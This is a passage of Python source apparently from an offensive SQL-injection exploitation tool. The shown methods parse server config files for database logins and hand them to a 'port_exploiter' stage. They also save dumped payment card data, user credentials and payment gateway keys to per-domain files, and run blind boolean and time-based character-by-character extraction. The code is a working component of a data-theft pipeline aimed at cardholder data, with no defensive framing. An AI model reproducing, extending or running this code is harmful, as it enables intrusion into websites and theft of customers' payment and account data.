                            dump.raw_dumps.append(f"=== FILE: {fpath} ===\n{content[:5000]}")
                    
                    # v3.2: Parse config files for DB credentials
                    if HAS_ADVANCED:
                        try:
                            config_creds = await ConfigCredentialParser.extract_and_parse_configs(
                                sqli, self, session,
                                existing_file_reads=file_reads,
                            )
                            if config_creds:
                                dump.raw_dumps.append(
                                    f"=== CONFIG CREDENTIALS (v3.2) ===\n"
                                    f"{json.dumps(config_creds, indent=2, default=str)}"
                                )
                                # Store credentials for port_exploiter handoff
                                for cred in config_creds:
                                    dump.gateway_keys.append({
                                        "type": "db_credential",
                                        "db_user": cred.get("db_user", ""),
                                        "db_pass": cred.get("db_pass", ""),
                                        "db_host": cred.get("db_host", ""),
                                        "db_name": cred.get("db_name", ""),
                                        "source_file": cred.get("source_file", ""),
                                    })
                                    logger.info(f"[ConfigCreds] DB cred: "
                                               f"{cred.get('db_user')}@{cred.get('db_host')}")
                        except Exception as e:
                            logger.debug(f"Config credential parsing error: {e}")
            except Exception as e:
                logger.debug(f"Advanced extraction error: {e}")
        
        logger.info(f"Targeted dump complete for {sqli.url}: "
                    f"{len(dump.card_data)} card entries, "
                    f"{len(dump.credentials)} credentials, "
                    f"{len(dump.gateway_keys)} gateway keys, "
                    f"{dump.total_rows} total rows")
        
        return dump

    def save_dump(self, dump: DumpedData, prefix: str = "") -> Dict[str, str]:
        """Save dumped data to files.
        
        Args:
            dump: DumpedData to save
            prefix: Optional filename prefix
            
        Returns:
            Dict of {type: filepath} for saved files
        """
        saved = {}
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        domain = re.sub(r'[^\w]', '_', dump.url.split("/")[2] if "/" in dump.url else "unknown")
        base_name = f"{prefix}{domain}_{timestamp}" if prefix else f"{domain}_{timestamp}"
        
        # Save card data
        if dump.card_data:
            filepath = os.path.join(self.output_dir, f"{base_name}_cards.json")
            with open(filepath, "w") as f:
                json.dump({
                    "source": dump.url,
                    "dbms": dump.dbms,
                    "database": dump.database,
                    "timestamp": dump.timestamp,
                    "count": len(dump.card_data),
                    "data": dump.card_data,
                }, f, indent=2)
            saved["cards"] = filepath
            logger.info(f"Saved {len(dump.card_data)} card entries to {filepath}")
        
        # Save credentials
        if dump.credentials:
            filepath = os.path.join(self.output_dir, f"{base_name}_creds.json")
            with open(filepath, "w") as f:
                json.dump({
                    "source": dump.url,
                    "dbms": dump.dbms,
                    "database": dump.database,
                    "timestamp": dump.timestamp,
                    "count": len(dump.credentials),
                    "data": dump.credentials,
                }, f, indent=2)
            saved["credentials"] = filepath
        
        # Save gateway keys
        if dump.gateway_keys:
            filepath = os.path.join(self.output_dir, f"{base_name}_keys.json")
            with open(filepath, "w") as f:
                json.dump({
                    "source": dump.url,
                    "dbms": dump.dbms,
                    "database": dump.database,
                    "timestamp": dump.timestamp,
                    "count": len(dump.gateway_keys),
                    "data": dump.gateway_keys,
                }, f, indent=2)
            saved["gateway_keys"] = filepath
        
        # Save all data as CSV
        if dump.data:
            filepath = os.path.join(self.output_dir, f"{base_name}_full.csv")
            # Collect all unique column names across all tables first
            all_fields = ["_table"]
            for table, rows in dump.data.items():
                for row in rows:
                    for key in row:
                        if key not in all_fields:
                            all_fields.append(key)
            with open(filepath, "w", newline="") as f:
                writer = csv.DictWriter(f, fieldnames=all_fields,
                                         restval="", extrasaction="ignore")
                writer.writeheader()
                for table, rows in dump.data.items():
                    for row in rows:
                        row_with_table = {"_table": table, **row}
                        writer.writerow(row_with_table)
            saved["full_csv"] = filepath
        
        # Save raw DIOS dump
        if dump.raw_dumps:
            filepath = os.path.join(self.output_dir, f"{base_name}_dios.txt")
            with open(filepath, "w") as f:
                f.write("\n\n---\n\n".join(dump.raw_dumps))
            saved["dios"] = filepath
        
        # Save schema
        if dump.tables:
            filepath = os.path.join(self.output_dir, f"{base_name}_schema.json")
            with open(filepath, "w") as f:
                json.dump({
                    "source": dump.url,
                    "dbms": dump.dbms,
                    "database": dump.database,
                    "tables": dump.tables,
                }, f, indent=2)
            saved["schema"] = filepath
        
        return saved

    # ==================== BLIND DUMPING ====================

    async def blind_targeted_dump(self, sqli: SQLiResult,
                                   session: aiohttp.ClientSession,
                                   progress_callback=None) -> DumpedData:
        """Perform blind data extraction for boolean/time-based SQLi.
        
        Delegates to BlindDumper for char-by-char extraction, then converts
        the result to DumpedData for pipeline compatibility.
        
        Args:
            sqli: SQLiResult with boolean or time injection_type
            session: aiohttp session
            progress_callback: Optional async callback for progress updates
            
        Returns:
            DumpedData with extracted findings (same format as targeted_dump)
        """
        if not self.blind_dumper:
            logger.warning("Blind dumper not initialized")
            return DumpedData(url=sqli.url, dbms=sqli.dbms or "unknown")
        
        if sqli.injection_type not in ("boolean", "time", "error"):
            logger.warning(f"blind_targeted_dump called with {sqli.injection_type}, skipping")
            return DumpedData(url=sqli.url, dbms=sqli.dbms or "unknown")
        
        logger.info(f"Starting blind {sqli.injection_type} dump for {sqli.url}")
        
        blind_result = await self.blind_dumper.blind_dump(
            sqli=sqli,
            session=session,
            progress_callback=progress_callback,
        )
        
        # Convert BlindDumpResult → DumpedData for pipeline compat
        return self._convert_blind_result(blind_result)

    def _convert_blind_result(self, blind: BlindDumpResult) -> DumpedData:
        """Convert BlindDumpResult to DumpedData for compatibility."""
        dump = DumpedData(
            url=blind.url,
            dbms=blind.dbms,
            database=blind.database,
            tables=blind.tables,
            data=blind.data,
            card_data=blind.card_data,
            credentials=blind.credentials,
            gateway_keys=blind.gateway_keys,
        )
        
        # Log stats
        stats = blind.stats
        logger.info(
            f"Blind dump stats: {stats.requests_made} requests, "
            f"{stats.chars_extracted} chars, {stats.tables_found} tables, "
            f"{stats.rows_extracted} rows in {stats.elapsed:.0f}s "
            f"({stats.requests_per_sec:.1f} req/s)"
        )
        
        return dump
